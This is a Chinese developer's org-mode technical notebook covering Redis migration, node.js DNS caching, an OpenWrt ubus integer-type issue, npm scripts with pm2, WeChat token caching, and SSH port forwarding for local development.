  
  要求新旧 Redis 实例比较稳定，发生全量同步会导致数据丢失。

- 服务从新 Redis 实例访问迁移走的数据
  
  可以通过给所有服务结点广播消息方式实现，将服务的 Redis 访问快速切到新 Redis 实例上。

  正常情况下，旧 Redis 中已迁移的数据应该不会再有读写，如果有的话可能是还没有迁移干净，应该立即找到访问源，进行中断或迁移。
  
- 新 Redis 实例断开与旧实例的 Master-Slave 关系

  新 Redis 实例改为角色为 Master，恢复 =slave-read-only= 配置项为 =yes= 。
  
  新的 Redis 实例可以进一步使用 Redis Sentinel 来监控以实现高可用。
  
- 删除新 Redis 实例中多迁来的数据

- 删除旧 Redis 实例中已迁走的数据

  所有数据都迁移走后，可以将它停掉。


最近看了《 [[http://www.infoq.com/cn/articles/online-data-migration-experience][在线数据迁移经验：如何为正在飞行的飞机更换引擎]] 》，发现前面的 redis 操作步骤与文章中的在线数据迁移步骤极其相似：

- 迁移前

  写旧、读旧

- 上线双写

  写新、写旧、读旧

- 历史数据搬迁

  写新、写旧、读旧

- 切读

  写新、写旧、读新

- 清理

  写新、读新。

这是一种数据迁移的通用模式。


另一篇文章《[[http://www.brunton-spall.co.uk/post/2014/05/06/database-migrations-done-right/][Database migrations done right - Michael Brunton-Spall]]》提出了一个基本原则:

#+begin_quote
你做出的每一处改动必须与系统的其余部分保持向后兼容

Every change you make must be backward compatible with the rest of the system
#+end_quote

* DONE 解决 DNS 服务器不稳定引起的服务超时问题                     :node:dns:
  CLOSED: [2016-10-11 Tue 20:30]

  微服务架构下，服务间常常会互相调用，调用前要先解析域名，如果 DNS 服务器不稳定则会导致服务响应超时。

  DNS 服务器一般由运维人员或者数据中心指定，属于不可控的因素，可以在程序内做 DNS 缓存缓解问题。

  通过 [[https://github.com/yahoo/dnscache][dnscache]] 模块可以为 node.js 应用全局启用 DNS 缓存。

  - 安装

    #+begin_src sh
      npm install dnscache
    #+end_src

  
  - 启用 DNS 缓存

    #+begin_src js
      var dnscache = require('dnscache')({
          "enable" : true,
          "ttl" : 300,
          "cachesize" : 1000
      });
    #+end_src


  启用 DNS 缓存后，只会在缓存过期后才会重新解析域名，如果重新解析域名时 DNS 服务器不稳定还是会导致服务响应超时，相比不用 dnscache 这种问题出现的机率减少了。

  想到一个对 dnscache 的改进：引入一个刷新时间 refresh_time （远小于缓存时间 ttl），每隔一段时间（refresh_time）异步重新解析一次缓存的域名，如果解析成功则更新 dnscache 并延长 ttl，这样只有当一段时间内（约为 ttl） DNS 服务器始终不稳定才会对服务造成影响，这个特性已在我的分支上实现 [[https://github.com/tangxinfa/dnscache/tree/feature-keepalive][feature-keepalive]] 。

* DONE blobmsg_json 只支持一种整型                            :openwrt:linux:
  CLOSED: [2016-10-31 Mon 20:23]

  在使用 ubus 时，发现 =blobmsg_policy= 中使用 =BLOBMSG_TYPE_INT64= 或 =BLOBMSG_TYPE_INT16= 类型后， =ubus list -v= 显示的参数类型为 =(unknown)= ， =blobmsg_parse= 解析请求相应字段为 =NULL= ，如下例所示

  =blobmsg_json_test.c=
  #+begin_src C
    #include <libubox/blobmsg_json.h>

    static const struct blobmsg_policy policy[] = {
        [0] = { .name = "name", .type = BLOBMSG_TYPE_STRING },
        [1] = { .name = "length", .type = BLOBMSG_TYPE_INT64 },
        [2] = { .name = "width", .type = BLOBMSG_TYPE_INT16 },
    };

    int main(int argc, char *argv[])
    {
        const char* json = "{\"name\":\"tree\", \"length\": 100000000, \"width\": 10}";
        struct blob_buf buf = {'\0'};
        blobmsg_buf_init(&buf);
        if (! blobmsg_add_json_from_string(&buf, json)) {
            fprintf(stderr, "load json to blob buf failed\n");
            return EXIT_FAILURE;
        }

        struct blob_attr *attr[ARRAY_SIZE(policy)];
        if (0 != blobmsg_parse(policy, ARRAY_SIZE(policy), attr, blob_data(buf.head), blob_len(buf.head))) {
            fprintf(stderr, "parse failed\n");
            return EXIT_FAILURE;
        }

        int i;
        for(i = 0; i < ARRAY_SIZE(policy); ++i) {
            if (! attr[i]) {
                fprintf(stderr, "parse failed: %s\n", policy[i].name);
            }
        }

        return EXIT_SUCCESS;
    }
  #+end_src

  运行结果
  #+begin_example
    $ ./blobmsg_json_test
    parse failed: length
    parse failed: width
  #+end_example

  引用相关讨论 [[http://logs.nslu2-linux.org/livelogs/openwrt-devel/openwrt-devel.20151103.txt]]
  #+begin_quote
  Nov 03 00:43:43 <txomon> So I think I found something strange in ubus, but I am not too sure. For some reason, declaring within a policy BLOBMSG_TYPE_INT16, won't be accepted, and blobmsg_get_u16 will return null
  
  Nov 03 00:44:04 <txomon> I mean, it is accepted but it will refuse to work
  
  Nov 03 00:44:17 <txomon> and in ubus -v list will appear as nil
  
  Nov 03 00:45:00 <txomon> it will appear as "(unknown)"
  
  Nov 03 00:47:17 <txomon> looking at the cli code, I understand why it appears as unknown, because int16 is not in there, but anyway, why doesn't it work for my client?
  
  Nov 03 00:48:17 <txomon> It might be because ubus cli is not prepared to send uint16?
  
  Nov 03 00:48:39 <txomon> (I always refer to BLOBMSG_TYPE_INT16)
  
  Nov 03 00:51:44 <txomon> well, I understand it isn't because json doesn't have such thing as int16... and indeed libubox/blobmsg_json.c L72 is just prepared for u32, but anyway, that means you can't use any datatype that doesn't match those ones!
  
  Nov 03 00:52:03 <txomon> shouldn't ubus cli inspect the interface and then send the correct datatype through ubus?
  
  Nov 03 00:55:27 <txomon> I suppose it's the same for uhttpd-mod-ubus
  
  Nov 03 01:01:23 <txomon> I have checked and yeah... so I will just use BLOBMSG_TYPE_INT32.... why does ubus even support that then? :(
  #+end_quote

  这是因为 json 只有一种整型，json 转 blogmsg 会转成 BLOBMSG_TYPE_INT32，引用自 =blobmsg_json.c=
  #+begin_src C
    bool blobmsg_add_json_element(struct blob_buf *b, const char *name, json_object *obj)
    {
        bool ret = true;
        void *c;

        if (!obj)
            return false;

        switch (json_object_get_type(obj)) {
        case json_type_object:
            c = blobmsg_open_table(b, name);
            ret = blobmsg_add_object(b, obj);
            blobmsg_close_table(b, c);
            break;
        case json_type_array:
            c = blobmsg_open_array(b, name);
            ret = blobmsg_add_array(b, json_object_get_array(obj));
            blobmsg_close_array(b, c);
            break;
        case json_type_string:
            blobmsg_add_string(b, name, json_object_get_string(obj));
            break;
        case json_type_boolean:
            blobmsg_add_u8(b, name, json_object_get_boolean(obj));
            break;
        case json_type_int:
            blobmsg_add_u32(b, name, json_object_get_int(obj));
            break;
        default:
            return false;
        }
        return ret;
    }
  #+end_src

  而解析 blobmsg 时，因为与预定义类型 =blobmsg_policy= 不一致 ~blob_id(attr) != policy[i].type~ ，相应字段被丢弃，引用自 =blobmsg.c=
  #+begin_src C
    int blobmsg_parse(const struct blobmsg_policy *policy, int policy_len,
                      struct blob_attr **tb, void *data, unsigned int len)
    {
        struct blobmsg_hdr *hdr;
        struct blob_attr *attr;
        uint8_t *pslen;
        int i;

        memset(tb, 0, policy_len * sizeof(*tb));
        pslen = alloca(policy_len);
        for (i = 0; i < policy_len; i++) {
            if (!policy[i].name)
                continue;

            pslen[i] = strlen(policy[i].name);
        }

        __blob_for_each_attr(attr, data, len) {
            hdr = blob_data(attr);
            for (i = 0; i < policy_len; i++) {
                if (!policy[i].name)
                    continue;

                if (policy[i].type != BLOBMSG_TYPE_UNSPEC &&
                    blob_id(attr) != policy[i].type)
                    continue;

                if (blobmsg_namelen(hdr) != pslen[i])
                    continue;

                if (!blobmsg_check_attr(attr, true))
                    return -1;

                if (tb[i])
                    continue;

                if (strcmp(policy[i].name, (char *) hdr->name) != 0)
                    continue;

                tb[i] = attr;
            }
        }

        return 0;
    }
  #+end_src

  =ubus= 命令行工具以及 =uhttpd-mod-ubus= 以 json 做为请求格式，因此不支持 =BLOBMSG_TYPE_INT64= 和 =BLOBMSG_TYPE_INT16= 字段类型，数据类型定义 =blobmsg_policy= 需要做一下折衷：

  - =BLOBMSG_TYPE_INT16= 改用 =BLOBMSG_TYPE_INT32=

  - =BLOBMSG_TYPE_INT64= 改用 =BLOBMSG_TYPE_STRING=

    封装一下方便使用

    #+begin_src C
      /**
       ,* 解析字符串形式传递的 uint64_t 消息字段值.
       ,* UBUS 传递 uint64_t 类型字段存在 BUG，需要以字符串形式传递.
       ,* 用于替换@ref blobmsg_get_u64.
       ,*
       ,* @param attr 消息字段.
       ,*
       ,* @return 消息字段值. @ref blobmsg_get_string.
       ,*/
      static inline uint64_t
      blobmsg_get_u64string(struct blob_attr *attr) {
          char* str = blobmsg_get_string(attr);
          if (str) {
              char* end = NULL;
              uint64_t value = strtoull(str, &end, 10);
              if (end && end[0] == '\0') {
                  return value;
              }
          }

          return 0;
      }

      /**
       ,* 添加字符串形式传递的 uint64_t 消息字段.
       ,* UBUS 传递 uint64_t 类型字段存在 BUG，需要以字符串形式传递.
       ,* 用于替换@ref blobmsg_add_u64.
       ,*
       ,* @param buf 消息缓冲区.
       ,* @param name 消息字段名.
       ,* @param val 消息字段值.
       ,*
       ,* @return 是否成功. @ref blobmsg_add_string.
       ,*/
      static inline int
      blobmsg_add_u64string(struct blob_buf *buf, const char *name, uint64_t val) {
          char value[20 + 1] = {'\0'};
          snprintf(value, sizeof(value), "%"PRIu64, val);
          return blobmsg_add_string(buf, name, value);
      }
    #+end_src


  C 中 64 位整形的取值范围，见 =/usr/include/limits.h=
  #+begin_src C
    /* Minimum and maximum values a `signed long int' can hold.  */
    #  if __WORDSIZE == 64
    #   define LONG_MAX     9223372036854775807L
    #  else
    #   define LONG_MAX     2147483647L
    #  endif
    #  define LONG_MIN  (-LONG_MAX - 1L)

    /* Maximum value an `unsigned long int' can hold.  (Minimum is 0.)  */
    #  if __WORDSIZE == 64
    #   define ULONG_MAX    18446744073709551615UL
    #  else
    #   define ULONG_MAX    4294967295UL
    #  endif
  #+end_src

  JSON/JavaScript 中 64 位整形的取值范围，引用自 [[https://cdivilly.wordpress.com/2012/04/11/json-javascript-large-64-bit-integers/][JSON/JavaScript and large 64 bit integer values | The former blog of cdivilly]]
  #+begin_quote
  JavaScript represents all numbers internally as 64 bit floating point values (see the ECMAScript spec here). This means JavaScript runtimes are not able to handle integer values larger than 9007199254740992 (2^53).

  Note that all the positive and negative integers whose magnitude is no greater than 2^53 are representable in the Number type
  #+end_quote

  可见，json 转 blobmsg 不将整型转化为 =BLOBMSG_TYPE_INT64= 因为 json 不能精确表示 64 位整型。

* TODO 高可用的后台服务                                        :architecture:

** DNS

** 接入层

   接入层（通常为 nginx）可实现以下目标：

   - 通过反向代理进行负载均衡

     
   - 压缩加密缓存优化


   - 提升可用性

     如结合 keepalived 通过浮动 IP 进行容错。


   简单的项目不需要接入层，但是复杂一些的项目则很有必要引入。

** 业务层

** 数据存储层
  
* DONE 概念设计：认证（Authentication）与授权（Authorization） :architecture:
  CLOSED: [2016-11-30 Wed 14:33]

** 认证（Authentication）

   验证我是谁。

** 授权（Authorization）

   在认证（Authorization）后，验证我被允许做什么。

** 认证（Authentication）接口原型

   #+begin_src c
     /**
      ,* Authenticate user identification.
      ,*
      ,* @param name - User name.
      ,* @param secret - Secret known only to the user.
      ,*
      ,* @return Returns authenticated user.
      ,*/
     User authenticate(const char* name, const char* secret)
   #+end_src

   - =authenticate= :: 验证用户身份

** 授权（Authorization）接口原型

   #+begin_src C
     /**
      ,* Authorize user to do operation.
      ,*
      ,* @param user - User to authorize.
      ,* @param Operation - Operation to authorize.
      ,*
      ,*/
     void authorize(User user, Operation operation);

     /**
      ,* Deauthorize user to do operation.
      ,*
      ,* @param user - User to deauthorize.
      ,* @param operation - Operation to deauthorize.
      ,*
      ,*/
     void deauthorize(User user, Operation operation);

     /**
      ,* Is user authorized to do operation.
      ,*
      ,* @param user - User to check.
      ,* @param operation - Operation to check.
      ,*
      ,* @return Is authorized or not.
      ,*/
     bool authorized(User user, Operation operation);
   #+end_src

   - =authorize= :: 允许用户操作
     
   
   - =deauthorize= :: 禁止用户操作


   - =authorized= :: 检查用户是否允许操作

** 参考

   - [[https://www.cyberciti.biz/faq/authentication-vs-authorization/][What Is The Difference Between Authentication And Authorization?]]

* DONE 使用 npm scripts 统一操作接口                                   :node:
  CLOSED: [2016-12-01 Thu 12:10]

  任何一个 Node.js 应用都会有一些基本的操作，如

  - 启动服务

    ./start.sh 或 systemctl start <service> 或 pm2 start app.json ...

  - 停止服务

    ./stop.sh 或 systemctl stop <service> 或 pm2 stop app.json ...

  - 重启服务

    ./restart.sh 或 systemctl restart <service> 或 pm2 restart app.json ...
    
  - 执行任务脚本

    node ./tools/qps.js 或 ./tools/qps.sh


  我们可能会使用 [[https://github.com/Unitech/pm2][pm2]] 来管理服务，使用 node 来执行脚本，服务往往会依赖一些环境变量的正确定义，如：

  - PATH
    
    同一机器可能跑了多个服务，而每个服务使用不同的 node.js 版本，通过设置 =PATH= 环境变量来决定使用哪个版本的 node.js。

  - NODE_ENV
  
    值为 =production= 表示运行在产品环境。

    值为 =development= 表示运行在开发环境。

    如果忘记设置 =NODE_ENV= 而导致在线上机器使用开发环境运行服务，后果会很严重。

  - PM2_HOME

    [[https://github.com/Unitech/pm2][pm2]] 会在 =PM2_HOME= （默认为当前用户的 HOME 目录） 目录下存放元数据，服务总是以特定的帐号（如：root）运行，线上机器往往会有多个帐号，
    当我们以非服务帐号登录系统，并使用 [[https://github.com/Unitech/pm2][pm2]] 管理我们的服务进程时，就可能以错误的帐号重复运行我们的服务。
  
  - NODE_CONFIG_DIR

    [[https://github.com/lorenwest/node-config][config]] 模块用于指定配置文件存放路径，同时它也会使用 =NODE_ENV= 环境变量来决定载入哪些配置文件。

  
  所以我们可能会写一大堆脚本，如：

  - .bashrc
    
    设置环境变量，由于一台机器上可能跑多个服务，而每个服务的环境设置会不一样，所以我们不好直接放置在用户根目录下的 =.bashrc= 中。


  - .bashrc.$HOSTNAME
    
    机器特定的环境变量，用于覆盖默认设置
    
    
  - start.sh

    会先载入 .bashrc 中定义的环境变量，再使用 =pm2 start <app>= 启动服务

  - stop.sh

    会先载入 .bashrc 中定义的环境变量，再使用 =pm2 stop <app>= 停止服务

  - restart.sh

    会先载入 .bashrc 中定义的环境变量，再使用 =pm2 restart <app>= 重启服务

  - pm2.sh
    
    会先载入 .bashrc 中定义的环境变量，再使用用户传入的参数执行 =pm2=
    
  - node.sh
    
    会先载入 .bashrc 中定义的环境变量，再使用用户传入的参数执行 =node=
  

  还有一堆 js 任务脚本，你得决定要不要提供配套的 bash 脚本（确保载入 .bashrc），或者祈祷运行前操作人员会记得先载入 =.bashrc= 。


  npm scripts 相关文章

  - [[https://medium.freecodecamp.com/why-i-left-gulp-and-grunt-for-npm-scripts-3d6853dd22b8#.a0ulmy8bk][Why I Left Gulp and Grunt for npm Scripts]]
    

  - [[http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html][npm scripts 使用指南 - 阮一峰的网络日志]]
    
 

  npm scripts 使用的是 shell 命令，npm scripts 的强大其实是 shell scripts 的强大，npm scripts 只是约定了统一的入口也就是操作界面。

  npm scripts 示例如下：

  #+begin_src json
    "scripts": {
      "node": "export NODE_ENV=${NODE_ENV:-production}; node",
      "pm2": "export NODE_ENV=${NODE_ENV:-production}; PM2=pm2; PM2_USER=${PM2_USER:-root}; [[ $HOME != `echo ~$PM2_USER` ]] && PM2=\"sudo -u $PM2_USER pm2\"; $PM2",
      "ps": "npm run pm2 -- list $npm_package_name",
      "prestart": "STARTED=`npm -s run pm2 -- jlist | json -a -c \"this.name == '$npm_package_name' && ['errored', 'stopped'].indexOf(this.pm2_env.status) == -1\" pm2_env.pm_id | wc -l`; [[ $STARTED > 0 ]] && echo $STARTED process already running; exit $STARTED",
      "start": "PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] && PM2_FILE=./process.${HOSTNAME}.json; npm run pm2 -- start $PM2_FILE",
      "stop": "PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] && PM2_FILE=./process.${HOSTNAME}.json; npm run pm2 -- stop $PM2_FILE",
      "restart": "PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] && PM2_FILE=./process.${HOSTNAME}.json; npm run pm2 -- startOrGracefulReload $PM2_FILE"
    }
  #+end_src

  运行 npm scripts：

  - =npm run=

    列出所有脚本。

  - =npm run pm2 -- list=

    执行 =pm2 list= ，会确保正确设置环境变量，并且必要时切换到 pm2 帐号。

  - =npm start=

    执行 =pm2 start= ，会确保正确设置环境变量，并且必要时切换到 pm2 帐号，通过 =prestart= 预先检查进程是否已启动，避免重启服务。

  - =npm run node -- tools/qps.js=
    
    执行 =node tools/qps.js= ，会确保正确设置环境变量。
    
 
  npm scripts 会自动将 ./node_modules/.bin 添加到 $PATH 环境变量，将 =package.json= 的内容暴露成环境变量供脚本引用，通过 =pre= 及 =post= 钩子自动执行前置/后置附带任务，通过在脚本中调用其它 npm scripts 脚本也可以简化脚本的开发。

  
  现在我们只有 npm scripts，所有的一切操作都从 npm run 开始，整个世界清净了。

* TODO 分布式系统的配置信息管理

** 配置信息包括哪些

   - 系统配置

     iptables、sysctl 等。

   - 监听的地址及端口号

     backlog、ulimit、ssl 证书等。

   - 数据库连接信息
     
     主机地址、端口号、用户名、密码、库名、字符集等

   - 要调用的第三方服务信息

     服务地址、端口号、分配的身份标识及密钥等

   - 日志文件

     文件路径名、日志级别等

   - 程序运行的用户名及用户组


   - 特性开关
     
     
   - 可微调的参数

     连接、请求超时时间、最大连接数、心跳间隔等

     
   - 用户管理信息

     管理员帐号密码、第三方服务调用方的 IP 及密钥等

   - 接口权限列表

** 谁来进行配置

   一般是开发人员自行配置，也可能会由运维人员来进行线上配置。

** 什么时候进行配置

   服务运行出现问题，会通过调整配置项进行修复，比如：第三方服务地址变动、密钥更换、新的第三方调用方加入、新 API 发布需要更新接口权限列表。

** 配置存放的位置

   - 操作系统配置文件

     主要是 sysctl 内核调优项、iptables 防火墙规则。

   
   - 应用启动脚本

     主要是 ulimit。

     一般是 bash 脚本。
   

   - 应用配置文件

     绝大多数变动不怎么频繁，且不需要实时生效的配置项，一般采用 ini、xml、json 做为文件格式。

     可以通过给应用发送信号 reload 配置，从而避免重启服务。
   
   - 数据库

     如放到 mysql、redis 数据库中。

     可以通过给应用发送信号 reload 配置，从而避免重启服务。

** 存在的问题

   - 不规范导致难以管理

     由于配置散落在很多地方，难以走查，服务器数量一多，就会出现一台改了配置另一台没有改的情况。

     很难获取当前生效的配置，无法自动进行配置比对以检查配置生效情况。

     配置文件的格式各异，修改时手误可能导致服务重启失败。

   - 配置可能没有生效

     像 sysctl 、iptables 配置项要使用 sysctl 和 iptables 命令生效配置，同时要确保存配置，避免重启后丢失。

     ulimit 的配置需要重启服务进程才能生效。

     放置在应用配置文件或数据库中的配置项，有的需要重启服务才能生效、有的需要向应用发送信号 reload 配置方可生效、有的实时生效。

   - 配置的安全性

     配置中可能包含敏感信息，如：密钥，不适合放到 git 中进行管理，没有一个很好的地方集中进行管理同时保证不丢失、不泄露。

     配置的 reload 难以正确实现，或者不通用，每个应用都要重新造轮子。

** 如何解决这些问题

* TODO 数据分析                          :data_mining:

** 数据分析的过程

   - 明确分析目的与框架

   - 数据收集

   - 数据处理

   - 数据分析

   - 数据展现

   - 撰写报告

     
   引用自 《[[http://mt.sohu.com/20150706/n416241596.shtml][数据运营经验：什么是数据分析？怎么做数据分析？-搜狐]]》。


** gnuplot

   [[http://www.gnuplot.info][gnuplot]] 是一个命令行驱动的交互式绘图工具，除了可以对一些函数进行绘图，还可以读取数据文件，选取指定的列做为 x、y 或 z 轴绘制二维或三维及其它各种数据图。

   属于“数据展现”阶段的工具，具备少量数据分析能力。

   生成 [[http://www.gnuplot.info][gnuplot]] 数据文件的 linux 命令行工具：

   - join

     按指定列合并两个数据文件，形成多列数据表，由 [[http://www.gnuplot.info][gnuplot]] 在一张图上展示多个数据，进行数据相关性分析。

* DONE 玩具项目                                                       :think:
  CLOSED: [2017-01-21 Sat 23:11]

  有一天，你接到一项任务，开发一个系统，这个系统被要求尽快上线，就像众多的其它项目一样，鲜明的互联网风格，快速开发、快速上线。

  你照做了，用最擅长的技术，大量重用以前项目里的东西，顺利地在截止日期前将系统写好并上线。

  它看起来有点粗糙，谈不上高性能、高可用、可扩展这些特性，一句话“Just works”。

  我们很忙，时间很宝贵，现在就为尚不存在的大量用户去做优化是不值得的，我们还有很多这种项目要做，我们信奉“不要过早优化”以及“尽早发布”。

  在互联网行业，上个首页后用户量暴增服务被压垮，并不罕见，是一个幸福的烦恼，我们的服务会及时演进，最终，拥有完美的代码和架构。

  而且不那么忙的时候，我们会静下心来偿还技术债务的，现在已经足够好了，让我们想想还有什么新项目可以做做。

  
  时间一天天过去，程序员长成了架构师，小王变成了老王。

  每一年都有新的产品走红，小公司变成独角兽，每一次业内会议上都会有大量架构演进的分享。

  或许下一次就轮到我们了，我们会跟着公司一起成长，在业务突飞猛进的情况下，不断打磨我们的技术，我们的程序会从一个个小玩具进化变成高楼大厦。

  
  所以我们现在还是玩具人生，在别人眼里，我们是一个问号，有待证明的问号。

* TODO WebSocket 与股票应用                              :think:architecture:

  WebSocket 是

  #+begin_quote
  服务器与客户端（主要是浏览器）的双向消息通讯协议
  #+end_quote

  应该可以用于股票行情、事件、社交消息推送。

  股票行情的推送可采用 =发布-订阅= 模式，客户端要维护关注的股票，如：自选股、全局指数、当前展示的板块、当前展示的股票等， 
  然后向服务器 =订阅= 这些股票，服务器实时 =发布= 最新的股票行情，客户端相应进行更新。

  服务主动推送事件、社交消息（可以认为客户端默认已 =订阅= ）。


  有可能只使用 =发布-订阅= 来做为服务器与客户端的通信方式，理论上是可以的。
  如果服务器能够知道客户端的当前状态，就完全消除主动拉取（通常通过 =HTTP= 协议）数据的行为，比如我们可以严格定义客户端
  应该拥有哪些状态，服务器再主动将状态更新推送给客户端，这需要实现精确的状态同步。

  =发布-订阅= 无法完全替代客户端主动拉取（通常通过 =HTTP= 协议）数据。

* TODO 技术团队开始阶段的管理                                        :manage:

  一个项目（或产品）的开始阶段，人员、资源、设计甚至产品定位等可能还不到位，如果等到所有依赖的东西都到位，时间就白白流逝掉了。
  处于这种情境下的人其实内心是焦虑的，有种使不上劲的感觉，时间浪费不可怕，可怕的是心气士气。

  这个时候管理的目标是理清思路，确认现阶段能够进行的事项，让团队的工作处于可跟踪状态，总有很多事情在依赖项不到位的情况下也可以推进。
  虽然业务需求还有完全确定下来，或者实现业务依赖的资源还没有到位，但是一个什么也不做的 APP Demo 还是可以拿出来的，有很多任务其实是立即着手进行的，
  如用户登录、注销。

* TODO React 技术栈入门                                                   :node:react:

  相比后端，前端的技术演进非常激进，自已还停留在 5 年前的 PC 时代，前端还是 JQuery、Boostrap、Dojo 之类的，裸写 JS、Html、CSS 还是家常便饭，然后移动时代到来，Backbone、Ember、Handlebars 之类的开始兴起，直到最近 Vue、React、Angular 开始刷屏。

  一个趋势就是越来越倚重 Javascript，前端的业务逻辑越来越复杂，到现在连 Html 也由 Javascript 来生成了，个人感觉冲击还是蛮大的，一直都觉得 Html 模板带来的所见即所得是必须坚持的，而 React、Angular 带来的前端工具链依赖，让我觉得什么时候前端开发这么繁琐了。

* DONE 微信公众号后台开发需要缓存的凭据                       :wechat:node:
  CLOSED: [2017-04-10 Mon 18:03]

  根据《[[https://mp.weixin.qq.com/wiki/7/85eff372c164ddc66c47777dc972279f.html][接口频率限制说明 - 微信公众平台开发者文档]]》，很多接口（API）都有调用次数限制，凭据（Token）使用过程中需注意超时、刷新。对这些凭据进行缓存一方面可以避免超出限制被平台拒绝服务，减少微信公众号接口调用次数也能够减少服务响应时间。

** 全局接口调用凭据

   根据《[[https://mp.weixin.qq.com/wiki/14/9f9c82c1af308e3b14ba9b973f99a8ba.html][获取access token - 微信公众平台开发者文档]]》中的描述，全局接口调用凭据有以下特性：


   - 每日调用次数限制

     新注册帐号每日 2000 次，认证服务号每日 100000 次。


   - 过期时间限制

     当前为 7200 秒

   
   - 过期前需重新获取（刷新）

     旧凭据会失效，刷新过程中公众平台会保证新、旧凭据短时间内同时可用。


   后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，如使用 =Redis= 或 =Memcached= 来缓存；如果每一处业务代码发现凭据过期时擅自去重新获取凭据，高并发情况下可能瞬间出现大量的刷新操作，导致超出每日的接口调用次数限制，最好由一个中控服务负责凭据的管理，其它业务服务需要凭据时访问中控服务，由中控服务来负责凭据的获取、刷新。


** 微信网页授权凭据

   根据《 [[https://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421140183&token=&lang=zh_CN][微信公众平台-微信网页授权]] 》中的描述，网页授权接口调用凭据有以下特性：


   - 每日调用次数限制

     无


   - 过期时间限制

     当前为 7200 秒

   
   - 过期前需重新刷新


   网页授权凭据是通过用户授权码（ =code= ）换取的，用户授权码是一次性的，与用户的后继会话交互要依赖该授权凭据（Token）。后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，并在过期前刷新该凭据。


** 微信JS接口的临时票据

   根据《[[https://mp.weixin.qq.com/wiki?action=doc&id=mp1421141115&t=0.5032559735352876#fl1][S-SDK使用权限签名算法-获取jsapi_ticket]] 》中的描述，微信JS接口的临时票据有以下特性：


   - 每日调用次数限制

     认证服务号每日 1000000 次


   - 过期时间限制

     当前为 7200 秒

   
   - 过期前需重新获取（刷新）

   
   后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，并在过期前重新获取。

* TODO node.js 后台应用更好地支持问题诊断                              :node:

  考虑一个真实的故障场景：

  #+begin_quote
  一早收到运维人员的故障报告：页面数据加载失败。
  #+end_quote

  赶紧打开电脑，ssh 上服务器，使用各种工具检测问题：ps 看后台进程是否启动、netstat 看连接是否异常、打开应用日志看服务是否有报错。

  然而问题没有那么简单，一翻折腾半个小时过去了，服务还横在那里，压力太大直接把服务重启，服务立即恢复，但是接下来不知道如何查找问题的根源。

  只有线上环境才会再现的问题往往是最以处理的，一般要运行很长时间才会出现，而出现后往往又迫于压力，要通过重启快速恢复服务，而没有为事后诊断留下足够的线索。

  可以通过自动化监控了缓解这个问题：

  - 实时监控服务外部接口

    通过模拟客户端操作，访问服务，第一时间发现服务故障并进行报警（短信、邮件）。


  - 服务除了输出关键的日志，还要实时对日志做一定的分析

    如：最近一分钟的请求数、成功数、失败数，并且进行归档，生成历史记录，以便通过跟历史进行对比，快速发现异常指标。

    
  - 对外部依赖项单独进行日志记录，以及实时分析

* TODO 微信公众号本地开发环境配置                                    :wechat:

** 微信公众后台开发要求

   微信公众后台开发要求开发者有外网可访问的 Web 服务，且运行在标准端口（http 80、https 443）。

** 本地开发方案

   采用 ssh 端口远程转发，将远程服务器上 80 端口的流量通过已建立的 ssh 连接转发到本地机器的任意端口。

   因此要求远程服务器上 80 端口不能跑其它服务，有 root 帐号，有独立的外网 IP。

   可以考虑花几十块买一个 VPS，开发过程中用一下。

   - 参考

     [[http://blog.csdn.net/a351945755/article/details/21785647][SSH的端口转发:本地转发Local Forward和远程转发Remote Forward - 明明 - 博客频道 - CSDN.NET]]

     [[https://www.zhihu.com/question/25456655][微信开发如何做本地调试？ - 知乎]]

** 远程服务器配置

   假定服务器的操作系统为 =CentOS= 。

*** 开启 ssh 远程转发

    修改 =/etc/ssh/sshd_config= ，添加以下配置

    #+begin_example
      GatewayPorts yes
    #+end_example

    重启 sshd 服务

    #+begin_src sh
      /etc/init.d/sshd restart
    #+end_src

   - 参考 =man 1 ssh=

     #+begin_quote
     By default, TCP listening sockets on the server will be bound to the loopback interface only.
     This may be overridden by specifying a bind_address.
     An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.
     Specifying a remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5)).
     #+end_quote

*** 对外开放 80 端口

    #+begin_src sh
      /sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT
      /etc/init.d/iptables save
    #+end_src

** 本地机器配置

*** 建立 SSH 隧道

    假设远程服务器外网 IP 为 =x.x.x.x= 、ssh 端口为 =27906= ，本地机器的 Web 服务监听在 =8001= 端口

    #+begin_src sh
       ssh -C -f -N -g -v -R :80:127.0.0.1:8001 root@x.x.x.x -p 27906
    #+end_src

    命令选项请参考 =man 1 ssh= 。

*** 启动本地 Web 服务

    在 =8001= 端口上运行 web 服务。

** 测试访问

   #+begin_src sh
     curl http://x.x.x.x/
   #+end_src

   应该会响应本地机器上 http://localhost:8001 的内容了。

* TODO 使用 webpack 优化本博客的加载速度                        :webpack:web:

  我的博客原本是使用 [[https://github.com/renard/o-blog][o-blog]] 来做为发布系统：使用 Emacs 的 =org-mode= 来编辑源文件，然后生成静态的 =html= 博客站点，再发布到 =github pages= 。

  后来因为 [[https://github.com/renard/o-blog][o-blog]] 跟 =Emacs= 新版本容易出现兼容性问题，同时个性化定制也不太方便，在 [[https://github.com/renard/o-blog][o-blog]] 起了一个 [[https://github.com/tangxinfa/ediary][ediary]] 项目用于生成博客， =Emacs lisp= 用来解析 =org-mode= 源文件以及将文章内容导出成 =html= ，然后写入一个 =json= 文件，另外再提供一些 =node.js= 脚本将 =json= 中的内容生成最终的静态博客站点。

  网页的加速速度一直很糟糕，平时发一个链接，别人半天打不开。

  主要是网页中引入了很多东西(bootstrap、less、Font-Awesome)并且没有做预编译，页面加速速度见下图

  [[file:../static/site_before_optmize.png]]

  耗时 1.6 分钟，完全不可用，接下来开始优化过程。

  决定使用 =webpack= 将 =less= 、 =js= 等打包在一起。

** 预编译 less 文件

   



